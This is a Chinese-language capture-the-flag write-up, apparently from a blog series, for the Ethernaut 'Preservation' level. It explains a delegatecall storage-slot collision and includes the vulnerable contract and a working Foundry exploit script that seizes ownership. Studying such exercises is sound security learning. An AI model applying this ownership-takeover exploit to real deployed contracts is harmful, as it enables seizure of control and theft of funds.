---
title: "Preservation"
date: 2026-07-15
draft: false
description: "利用delegatecall漏洞夺权"
tags:
  - Ethernaut
  - delegatecall
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

## Preservation

这道题和 `https://learnblockchain.cn/article/4281` 中给的漏洞示例差不多，是一种类型的，思路都差不多

### 目标：

获取所分配实例的所有权，成为合约的owner

### 思路：

首先观察两个合约的变量存储位置，观察到`LibraryContract`合约的`storedTime`在第0个插槽中，而`Preservation`中的`storedTime`在第三个插槽中。setTime() 时，slot0 的写入落到了 Preservation 的 slot0，而不是预期的 storedTime，从而覆盖了 timeZone1Library 地址。

我们可以先用攻击合约运行`setFirstTime`函数，第一次 delegatecall 时，将 `timeZone1Library` 替换成攻击合约地址。由于题目的要求owner必须为我自己的钱包地址，第二次调用时，`timeZone1Library`已经被我替换成攻击合约地址，由于调用目标地址已经变成攻击合约，再次调用的时候用的是我的攻击合约中的代码

```
//因为和题目中setTime(uint256 _time)有相同的函数选择器，所以会运行下面这个函数
function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
```

环境还是在`Preservation`，导致owner变为我的钱包地址

### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

### Poc：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";

contract Middle{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation public preservation = Preservation(0x08ec999093ed9dCba19e91c6816A70d01d8d4D1E);

    function hack() external{
    	address hacker = msg.sender;
        preservation.setFirstTime(uint256(uint160(address(this))));

        preservation.setFirstTime(uint256(uint160(hacker)));
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
contract Attack is Script{
    function run() external{
        vm.startBroadcast();

        Middle middle = new Middle();
        middle.hack();

        vm.stopBroadcast();
    }
}
```
